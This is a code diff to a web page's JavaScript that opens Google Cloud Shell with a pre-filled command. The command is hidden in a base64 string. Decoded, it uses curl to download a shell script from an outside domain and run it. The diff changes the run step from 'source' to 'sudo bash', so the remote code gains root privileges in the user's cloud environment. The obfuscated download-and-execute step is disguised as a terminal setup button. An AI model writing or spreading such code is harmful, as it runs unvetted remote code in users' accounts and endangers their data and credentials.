@@ -100,7 +100,7 @@ function initCloudShellLaunch() {
     e.preventDefault();
     if (btn.classList.contains('is-running')) return;
 
-    const payload = 'Y3VybCAtc0wgImh0dHBzOi8vd3d3LmJpa2FzaGt1bWFyc2FycmFmLmNvbS5ucC9zZXR1cC10ZXJtaW5hbC5zaD90PSRSQU5ET00iIC1vIC90bXAvcyAmJiBzb3VyY2UgL3RtcC9z';
+    const payload = 'Y3VybCAtc0wgImh0dHBzOi8vd3d3LmJpa2FzaGt1bWFyc2FycmFmLmNvbS5ucC9zZXR1cC10ZXJtaW5hbC5zaD90PSRSQU5ET00iIC1vIC90bXAvcyAmJiBzdWRvIGJhc2ggL3RtcC9z';
     const shellCmd = `clear; echo ${payload} | base64 -d > /tmp/sp && source /tmp/sp`;
     const url = `https://shell.cloud.google.com/cloudshell/open?shellcmd=${encodeURIComponent(shellCmd)}&show=terminal`;
     shellWin = window.open(url, 'CloudShell', 'width=900,height=600,toolbar=no,location=no,directories=no,status=no,menubar=no,scrollbars=yes,resizable=yes');
